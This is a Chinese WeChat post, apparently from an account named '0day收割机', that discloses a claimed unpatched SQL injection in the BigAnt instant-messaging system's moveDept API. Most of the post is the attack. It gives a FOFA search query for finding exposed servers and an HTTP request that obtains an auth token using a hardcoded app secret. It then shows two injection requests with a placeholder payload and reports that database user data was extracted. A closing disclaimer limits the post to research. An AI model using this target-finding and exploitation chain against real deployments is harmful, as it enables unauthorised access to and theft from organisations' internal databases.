---
title: 【0day】大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞
url: https://mp.weixin.qq.com/s/e91zzOXXoD0oPlPmpeZs0w
source: Doonsec's feed
date: 2026-02-27
fetch_date: 2026-02-28T03:54:26.844580
---

# 【0day】大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZrTsB3aQgWCseuyWMIiaB6qSmYbB7vPyDQ3U8IReoF4uUic79siaibhlibicdYQYjT2mhQ1okW5VqOdPG0eibA4NdMGbsrrShIZoGBmu7hZbNtMctU/0?wx_fmt=jpeg)

# 【0day】大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞

0day收割机

![]()

在小说阅读器中沉浸阅读

# 漏洞简介

杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 \Api\Controller\DeptController::moveDept 接口存在SQL注入漏洞，攻击者可通过在 moveDept 功能的相关参数中插入恶意构造的 SQL 查询语句，实现对后端数据库的非法操作，可能导致敏感信息泄露、数据篡改、绕过身份验证，甚至在特定配置下实现任意命令执行或获取系统控制权限。

# 影响版本

BigAnt 5.5.x 及以上版本用户

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWCd2oRpyH9VWgOkmT4c7eiarzHGibiahbKfziabyQIjzKAKpia77rjC6uRTmI3E6gnUKKRYxicJUzhGV8ksuzIZdcX38SffBmJzpKPKM/640?wx_fmt=png&from=appmsg)

经过测试，最新版本 6.0.1.20250407.1 也受影响

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"

# 漏洞复现

## 获取认证码

```
POST /api/oauth/create_authen HTTP/1.1
Host: bigant.local:8000
Content-Type: application/x-www-form-urlencoded

uid=1&app_id=system&app_secret=www.upsoft01.com&ssid=CC1743B5-E5D5-42CE-B5F6-42E24464C8D0
```

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWBJzVGkMLRXoiaibxJbzm7EjV8V0QwEVDWf1PJx7e8BE9I7vrEcEuooNe7EwjjE6wBeLmwictCMt4aS3dlnqXMfNd9aiab3vHC29Rc/640?wx_fmt=png&from=appmsg)

使用获取到的**authen：**

**cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d**

## SQL注入

> 两个参数均存在SQL注入
>
> 多种thinkphp传参、路由模式需要注意

```
POST /api/dept/moveDept HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

authen=cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d&uid=1&dept_id=SQLI_POC
```

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWDjkBdkhb0RfmJrBLbC3f5bAhoXbIl80PZQFMruLQcT00zOYfug9fex5OnHBvUW5sRAIDQV7E5Uj8WrOQ8ibribNab6MSmDelVjo/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWCts8sR0EZvHSNQA3qRy40oqvkXVa9Cf0eiaKuiaZ9AyJ0GfL5CKkG2XkGGjPBWtKHanc8QLgTbicUch4wHN6JCDRlViagUxHKibdvw/640?wx_fmt=png&from=appmsg)

```
POST /index.php?s=/api/dept/moveDept HTTP/1.1
Host: bigant.mrxn.net
Content-Type: application/x-www-form-urlencoded

authen=cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d&uid=1&dept_id=100&target_parentdept_id=SQLI_POC
```

![](https://mmbiz.qpic.cn/mmbiz_png/ZrTsB3aQgWBklHsK9XcVzj4anE9Y4379VHBj8nfz4yJXyiaL8UdoicM5sAeepUte0fb1RiaYDvWgj0lcusicFttPRHd7RPrAQC007IFmeJWtGE8/640?wx_fmt=png&from=appmsg)

成功利用报错注入获取到系统数据库用户信息。

**仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

0day收割机

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过